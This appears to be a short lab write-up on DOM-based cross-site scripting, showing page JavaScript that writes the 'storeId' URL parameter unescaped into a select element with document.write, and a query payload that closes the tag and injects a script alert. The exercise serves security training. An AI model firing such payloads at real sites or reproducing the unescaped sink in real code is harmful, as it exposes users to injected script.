## XSS Lab 3: DOM XSS inside select element Sink

### Analysis
The product page shows that the script gets a value called `storeId` from the `location.search` and then uses it uses it in `document.write` to show the stock. 

Adding a `storeId` with a random string to the URL query will show the string in the dropdown menu. 

Javascript:
```
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
```

XSS Query:
```
product?productId=2&storeId="><script>alert(0)</script>
```